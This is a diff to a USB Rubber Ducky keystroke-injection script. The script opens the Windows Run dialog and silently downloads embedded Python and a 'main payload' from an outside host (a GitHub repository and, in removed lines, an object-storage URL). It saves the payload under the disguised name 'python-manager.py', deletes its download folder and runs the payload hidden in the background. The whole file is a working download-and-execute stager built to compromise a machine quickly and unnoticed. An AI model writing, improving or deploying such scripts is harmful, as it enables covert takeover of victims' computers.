@@ -4,44 +4,35 @@ REM Download python to temp directory
 REM Install python quietly via cmdline
 REM Download and run the main payload
 
+FUNCTION RUN()
+    GUI r
+    DELAY 500
+END_FUNCTION
+
 DEFAULT_DELAY 50
 
-GUI r
-STRING cmd
-ENTER
-DELAY 500
-
 REM Download python
-REM start /b runs process in background - we want the terminal to stay on the screen for as little as possible
-STRING cd %localappdata%
-ENTER
-STRING start /b curl --create-dirs --output-dir %localappdata%\temp -o tmp7.exe "https://www.python.org/ftp/python/3.13.5/python-3.13.5-amd64.exe"
-ENTER
 
-REM Because curl is background we can kill command prompt
-ALT F4
-DELAY 10000
+RUN()
+STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zip https://www.python.org/ftp/python/3.13.5/python-3.13.5-embed-amd64.zip
 
-GUI r
-STRING cmd
-ENTER
-DELAY 500
-
-REM Install python
-GUI r
-DELAY 100
-STRING start /b %localappdata%\temp\tmp7.exe /log nul /quiet TargetDir=%localappdata%\python1 AssociateFiles=0 CompileAll=1 Include_doc=0 Include_launcher=0 Include_tcltk=0 Include_test=0
+REM Download main payload while python being downloaded
+RUN()
+STRING curl -q -s --output-dir %localappdata%\python1 -o python-manager.py https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py
 DELAY 30000
 
-REM Download main payload
-GUI r
-DELAY 100
-STRING start /b curl -output-dir %localappdata%\python1 -o python-manager.py "https://hc-cdn.hel1.your-objectstorage.com/s/v3/fdb57365c00e7a5cc6521098d8e732e3075f01f6_payload.py"
+REM Unzip python
+RUN()
+STRINGLN cmd /c "cd %localappdata% && mkdir python1 > nul & tar -xf Temp\py\tmp.zip --cd python1"
+
+REM remove python download dir to avoid pollution
+RUN()
+STRING rmdir /s /q %localappdata%\Temp\py\
+
 DELAY 3000
 
 REM Run main payload
-GUI r
-DELAY 100
-STRING start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
+RUN()
+STRING cmd /c start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
 
 REM Done!
